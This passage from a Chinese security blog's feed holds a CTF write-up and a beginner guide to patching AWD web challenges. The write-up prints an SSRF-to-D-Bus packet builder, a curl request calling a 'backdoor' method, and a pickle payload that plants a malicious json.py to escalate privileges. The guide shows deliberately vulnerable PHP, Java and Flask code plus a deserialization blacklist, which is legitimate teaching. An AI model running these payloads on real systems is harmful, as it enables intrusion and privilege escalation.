<p>经过测试，发现这些数据包类似redis，可以一起发送，并且服务端那边都会解析，这边把发送的数据包全部复制下来，然后一起发送<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import socket</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制字符串转换为字节流</span></span><br><span class="line">hex_data2 = <span class="string">&quot;6c01000100000000040000004d00000001016f000f0000002f6374662f73796e635365727665720006017300040000003a312e3200000000020173000e0000006374662e73796e635365727665720000030173000400000070696e6700000000&quot;</span></span><br><span class="line">hex_data1 = \</span><br><span class="line"><span class="string">&quot;00415554482045585445524e414c2033300d0a&quot;</span>+\</span><br><span class="line"><span class="string">&quot;4e45474f54494154455f554e49585f46440d0a&quot;</span>+\</span><br><span class="line"><span class="string">&quot;424547494e0d0a6c01000100000000010000006e00000001016f00150000002f6f72672f667265656465736b746f702f4442757300000006017300140000006f72672e667265656465736b746f702e444275730000000002017300140000006f72672e667265656465736b746f702e4442757300000000030173000500000048656c6c6f000000&quot;</span>+\</span><br><span class="line"><span class="string">&quot;6c01000113000000020000007f00000001016f00150000002f6f72672f667265656465736b746f702f4442757300000006017300140000006f72672e667265656465736b746f702e444275730000000002017300140000006f72672e667265656465736b746f702e4442757300000000030173000c0000004765744e616d654f776e65720000000008016700017300000e0000006374662e73796e6353657276657200&quot;</span>+\</span><br><span class="line"><span class="string">&quot;6c01000131000000020000006800000001016f000f0000002f6374662f73796e6353657276657200020173000e0000006374662e73796e63536572766572000003017300080000006261636b646f6f720000000000000000060173000e0000006374662e73796e63536572766572000008016700027373000500000061646d696e00000020000000376630383735353865383964623764313662613064643037646537623436363000&quot;</span></span><br><span class="line">s = <span class="string">&#x27;e655097da782a691cf830ed640dbead5&#x27;</span></span><br><span class="line">hex_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    hex_str += hex(ord(c))[2:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hex_str)</span><br><span class="line">hex_data1 = hex_data1.replace(<span class="string">&quot;3766303837353538653839646237643136626130646430376465376234363630&quot;</span>,hex_str) <span class="comment"># 替换secretkey</span></span><br><span class="line">packet_data1 = binascii.unhexlify(hex_data1)</span><br><span class="line">url_encoded_data = urllib.parse.quote(packet_data1)</span><br><span class="line"><span class="built_in">print</span>(url_encoded_data)</span><br></pre></td></tr></table></figure><br>拿到url_encoded_data，发包<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=curl&amp;method=%00AUTH%20EXTERNAL%203333%0D%0ANEGOTIATE_UNIX_FD%0D%0ABEGIN%0D%0Al%01%00%01%00%00%00%00%01%00%00%00n%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%05%00%00%00Hello%00%00%00l%01%00%01%13%00%00%00%02%00%00%00%7F%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%0C%00%00%00GetNameOwner%00%00%00%00%08%01g%00%01s%00%00%0E%00%00%00ctf.syncServer%00l%01%00%011%00%00%00%02%00%00%00h%00%00%00%01%01o%00%0F%00%00%00/ctf/syncServer%00%02%01s%00%0E%00%00%00ctf.syncServer%00%00%03%01s%00%08%00%00%00backdoor%00%00%00%00%00%00%00%00%06%01s%00%0E%00%00%00ctf.syncServer%00%00%08%01g%00%02ss%00%05%00%00%00admin%00%00%00%20%00%00%00e655097da782a691cf830ed640dbead5%00&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;tcpstr=unix%3A%2F%2F%2Fvar%2Frun%2Fdbus%2Fsystem_bus_socket&amp;data=1</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意 <code>AUTH EXTERNAL 3333</code>，这里这个3333是当前用户的权限id，可以通过读取 <code>/etc/passwd</code> 获取，33就是3的hex，当前用户实际的id是33，如果是root那就是0对应的hex就是30</p>
</blockquote>
<p>发完就可以成功反序列化了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找了好久，最后在 <code>flagService.py</code> 发现端倪，该服务由root权限启动<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@dbus.service.method(<span class="params"><span class="string">&quot;ctf.flag.service&quot;</span>, in_signature=<span class="string">&#x27;s&#x27;</span>, out_signature=<span class="string">&#x27;s&#x27;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getTime</span>(<span class="params">self, <span class="built_in">format</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">__import__</span>(<span class="string">&quot;json&quot;</span>).dumps(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>, <span class="string">&quot;time&quot;</span>: time.strftime(<span class="built_in">format</span>, time.localtime())&#125;)</span><br></pre></td></tr></table></figure><br>初看以为是获取当前时间戳的，但是仔细思考发现了这个 <code>__import__(&quot;json&quot;)</code><br>当往同级目录下面写入 <code>json.py</code> 然后再去访问这个路由，他就会加载我们写入的文件，并且执行 <code>dumps</code> 函数，那么就很明了了<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64,random,hashlib,time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&#x27;echo &quot;import os\\ndef dumps(a):\\n\\tos.system(\&quot;touch /tmp/aaa &amp;&amp; chmod 777 /flag\&quot;)&quot; &gt; /app/json.py 2&gt;&amp;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure><br>先这样写入文件，然后用同样的方法获取到访问这个getTime的数据包，然后把data搞出来<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=curl&amp;method=%00AUTH%20EXTERNAL%203333%0D%0ANEGOTIATE_UNIX_FD%0D%0ABEGIN%0D%0Al%01%00%01%00%00%00%00%01%00%00%00n%00%00%00%01%01o%00%15%00%00%00/org/freedesktop/DBus%00%00%00%06%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%02%01s%00%14%00%00%00org.freedesktop.DBus%00%00%00%00%03%01s%00%05%00%00%00Hello%00%00%00l%01%00%01%07%00%00%00%02%00%00%00w%00%00%00%01%01o%00%11%00%00%00/ctf/flag/service%00%00%00%00%00%00%00%02%01s%00%10%00%00%00ctf.flag.service%00%00%00%00%00%00%00%00%03%01s%00%07%00%00%00getTime%00%06%01s%00%10%00%00%00ctf.flag.service%00%00%00%00%00%00%00%00%08%01g%00%01s%00%00%02%00%00%00aa%00&amp;url=http%3A%2F%2F127.0.0.1%3A8080%2FgetCode&amp;tcpstr=unix%3A%2F%2F%2Fvar%2Frun%2Fdbus%2Fsystem_bus_socket&amp;data=1</span><br></pre></td></tr></table></figure><br>然后通过php读取/flag即可</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>ctf</tag>
        <tag>dbus</tag>
      </tags>
  </entry>
  <entry>
    <title>awdp-web-小白</title>
    <url>/2024/06/12/awdp-web-%E5%B0%8F%E7%99%BD/</url>
    <content><![CDATA[<h1 id="awdp"><a href="#awdp" class="headerlink" title="awdp"></a>awdp</h1><p>因为本章纯新手向，所以只讲讲防御应该怎么防御<br>awdp介绍<br>一般会给你一个附件让修复里面的漏洞，然后提交修复好的附件进行check，并且提交次数是有限制的，假如是5次，你提交5次都没check过，那你就不允许继续提交了，所以要谨慎修复<br><span id="more"></span></p>
<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="seay-amp-d盾"><a href="#seay-amp-d盾" class="headerlink" title="seay &amp; d盾"></a>seay &amp; d盾</h2><p>下载后直接扫描，会给出漏洞结果，但是该工具是基于正则表达式，所以可能存在很多误报，<br>d盾也可以扫描，但是扫描结果不全，但是准确率高点，推荐先用d盾进行扫描</p>
<h2 id="watchbird"><a href="#watchbird" class="headerlink" title="watchbird"></a>watchbird</h2><p><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a><br>根据教程直接安装</p>
<h2 id="常见漏洞代码"><a href="#常见漏洞代码" class="headerlink" title="常见漏洞代码"></a>常见漏洞代码</h2><p>下面只是给出漏洞代码，如果watchbird不能解决的问题，那也不是给小白解决的，所以只给出简单漏洞代码，和修复建议</p>
<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 含有SQL注入漏洞的查询</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;登录成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一般修复就是对 <code>$password</code> 进行过滤，过滤掉引号那些</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$uploadFile</span> = <span class="variable">$uploadDirectory</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查上传目录是否存在，不存在则创建</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDirectory</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDirectory</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不安全的文件上传</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadFile</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件已成功上传。&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>未限制后缀名，直接上传，修复方法直接白名单后缀</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不安全的文件包含</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未指定页面。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最简单的方法就是直接删掉 include<br>当然还有以下几个可以文件包含的函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span></span><br><span class="line"><span class="keyword">require</span></span><br></pre></td></tr></table></figure></p>
<h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>给出最常见的命令执行函数，遇见直接删掉就行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span></span><br><span class="line">system</span><br><span class="line">`` <span class="comment">// 反引号</span></span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br></pre></td></tr></table></figure></p>
<h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="springboot-jar"><a href="#springboot-jar" class="headerlink" title="springboot jar"></a>springboot jar</h2><ol>
<li>jar包解压</li>
<li><code>python class2java.py BOOT-INF/classes/com #根据具体路径</code></li>
<li>IDEA打开BOOT-INF/classes，导入BOOT-INF/lib，开始调试</li>
<li>加入防御代码，编译运行后，将target里面编译后新的class文件粘贴到原本的jar包中</li>
</ol>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>我这里只讲java的原生反序列化，不涉及hessian，kryo等其他序列化器<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DataObject <span class="title function_">deserializeBase64</span><span class="params">(<span class="meta">@RequestBody</span> String base64Data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解码 Base64 数据</span></span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(base64Data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data))) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataObject) ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to deserialize object&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>大概漏洞原理就是反序列化会类里面的执行readObject，然后readObject，而该类的readObject含有高危代码</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>重写 ObjectInputStream#readClassDescriptor (重新该类是为了防止utf8-overlong绕过)<br>添加黑名单（白名单最好）</p>
<p>MyObjectInputStream.java（记得加package）</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> ArrayList&lt;String&gt; blackList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="built_in">super</span>(inputStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> ObjectStreamClass <span class="title function_">readClassDescriptor</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="built_in">super</span>.readClassDescriptor();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">         <span class="keyword">if</span> (readDesc.getName().contains((CharSequence)blackList.get(i))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> readDesc;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      blackList.add(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.syndication.feed.impl.ToStringBean&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Apache Commons Collections</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections.functors.FactoryTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Apache Commons Beanutils</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Spring Framework</span></span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;org.springframework.transaction.jta.JtaTransactionManager&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Sun/Oracle</span></span><br><span class="line">      blackList.add(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.rmi.MarshalledObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Additional dangerous classes</span></span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.PriorityQueue&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.ArrayDeque&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.HashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.Hashtable&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.LinkedHashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.concurrent.ConcurrentSkipListMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.TreeMap&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.util.zip.ZipFile&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.FileOutputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.FileInputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.ObjectInputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.io.ObjectOutputStream&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.net.Socket&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;java.nio.file.Files&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// custom</span></span><br><span class="line">      blackList.add(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.alibaba.fastjson&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;POJONode&quot;</span>);</span><br><span class="line">      blackList.add(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    </div>
</div>
<p>springboot代码也要改成如下(记得import上面的类)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/deserialize&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DataObject <span class="title function_">deserializeBase64</span><span class="params">(<span class="meta">@RequestBody</span> String base64Data)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解码 Base64 数据</span></span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(base64Data);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化数据，修改序列化器</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data))) &#123;</span><br><span class="line">            <span class="keyword">return</span> (DataObject) ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Failed to deserialize object&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="rce-1"><a href="#rce-1" class="headerlink" title="rce"></a>rce</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">var</span>);</span><br><span class="line">java.lang.ProcessBuilder(<span class="string">&quot;xxx&quot;</span>).start();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.UNIXProcess(<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>特殊(反射)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clazz.getDeclaredMethod</span><br><span class="line">method.invoke</span><br></pre></td></tr></table></figure></p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>直接删除</p>
<h2 id="java总结"><a href="#java总结" class="headerlink" title="java总结"></a>java总结</h2><p>不嫌麻烦可以用codeql进行扫描<br><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a><br>根据教程即可，但是需要安装codeql，有点麻烦<br>CodeQL的数据库中本质上保存的是与代码相关的AST语法树</p>
<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>漏洞代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	ip, port = re.findall(pattern,request.host).pop()</span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form.get(<span class="string">&quot;word&quot;</span>):</span><br><span class="line">		word = request.form.get(<span class="string">&quot;word&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> waf(word):</span><br><span class="line">			word = <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		word = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	result = render_template_string(content % (<span class="built_in">str</span>(ip), <span class="built_in">str</span>(port), <span class="built_in">str</span>(word)))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">		result = <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">	<span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><br>该代码从post请求中获取传入的值，最后带入到了 <code>render_template_string(content % (str(ip), str(port), str(word)))</code><br>看到最后有个render之类的函数，并且传入的参数可控，就很可能是ssti的漏洞点</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修复代码</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;&#125;&#125;&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;&#123;%&#x27;</span> <span class="keyword">in</span> word <span class="keyword">or</span> <span class="string">&#x27;%&#125;&#x27;</span> <span class="keyword">in</span> word:</span><br><span class="line">    word = <span class="string">&quot;Hacker!&quot;</span></span><br></pre></td></tr></table></figure>
<p>一般来说过滤掉 <code>&#123;&#123;`,`&#125;&#125;</code>,<code>&#123;%`,`%&#125;</code>，就可以很大程度防止该漏洞。如果遇到可以编码绕过的形式，那也不是小白能做的了。</p>
<h2 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h2><p>参考文章：<a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
